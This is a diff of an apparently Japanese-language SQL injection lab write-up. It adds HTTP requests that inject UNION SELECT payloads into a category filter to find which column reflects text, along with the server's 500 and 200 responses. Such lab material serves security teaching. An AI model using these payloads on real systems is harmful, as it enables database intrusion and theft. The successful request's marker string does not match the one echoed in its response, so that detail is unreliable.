@@ -81,12 +81,27 @@ HTTP/2 500 Internal Server Error
 <summary>6 HTTPリクエスト/レスポンス</summary>
   
 リクエスト
-GET /filter?category=' OR 1=2 -- HTTP/2
+GET /filter?category=Pets' union select 'y9LdLy',null,null -- HTTP/2
   
 レスポンス
-<h1>&apos; OR 1=2 --</h1>
-<section class="container-list-tiles">
-</section>
+HTTP/2 500 Internal Server Error
+  
+リクエスト
+GET /filter?category=Pets' union select null,'y9LdLy',null -- HTTP/2
+  
+レスポンス
+HTTP/2 200 OK
+<h1>Pets&apos; union select null,&apos;F53rJS&apos;,null --</h1>
+<tr><th>F53rJS</th></tr>
+
+
+ 
+リクエスト
+GET /filter?category=Pets' union select null,null,'y9LdLy' -- HTTP/2
+  
+レスポンス
+HTTP/2 500 Internal Server Error
+
    
 </details>
 
